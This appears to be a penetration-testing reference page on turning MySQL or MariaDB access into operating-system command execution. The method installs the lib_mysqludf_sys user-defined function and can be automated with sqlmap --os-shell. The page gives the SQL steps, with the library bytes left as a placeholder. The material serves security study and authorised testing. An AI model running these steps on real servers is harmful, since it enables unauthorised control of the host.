---
title: "MySQL command execution: user-defined functions"
description: "Running operating-system commands from MySQL or MariaDB as the service account by installing a user-defined function (lib_mysqludf_sys) into the plugin directory, the standard route from database access to code on the host."
keywords:
  - user-defined function
  - lib_mysqludf_sys
  - plugin_dir
  - MySQL RCE
  - sys_exec
---

# MySQL command execution

MySQL has no built-in command shell, so execution goes through a **user-defined function (UDF)**: a shared library placed in the server's plugin directory and registered as a SQL function that runs OS commands. The classic library is `lib_mysqludf_sys`, exposing `sys_exec` and `sys_eval`.

## Installing the UDF

The requirements are the **`FILE`** (or `INSERT` on `mysql`) privilege and a writable **`@@plugin_dir`**:

```sql
SELECT @@plugin_dir;                       -- where the library must land
-- write the platform library into the plugin dir (see file access for the write primitive)
SELECT 0xMACHINECODE INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```

## Exploitation notes

- Commands run as the **MySQL service account** (`mysql` on most Linux hosts), so this is host access as that user and a pivot point, not usually root directly.
- The library must match the server's platform and be written into `@@plugin_dir`, which relies on the [file-write](file-access.md) primitive, so the two techniques chain.
- `sqlmap --os-shell` automates the whole UDF path (write library, register functions, run commands) and is the fastest route in practice.
- On Windows MySQL, the same UDF approach applies with a `.dll` and typically a more privileged service account.

## Tools

- **sqlmap** (`--os-shell`, `--os-cmd`): automated UDF upload and command execution.
- **lib_mysqludf_sys**: the UDF library providing `sys_exec`/`sys_eval`.
- **mysql**: run the `CREATE FUNCTION` statements directly.

## References

- [HackTricks: MySQL UDF command execution](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html)
- [lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)
- [PayloadsAllTheThings: MySQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
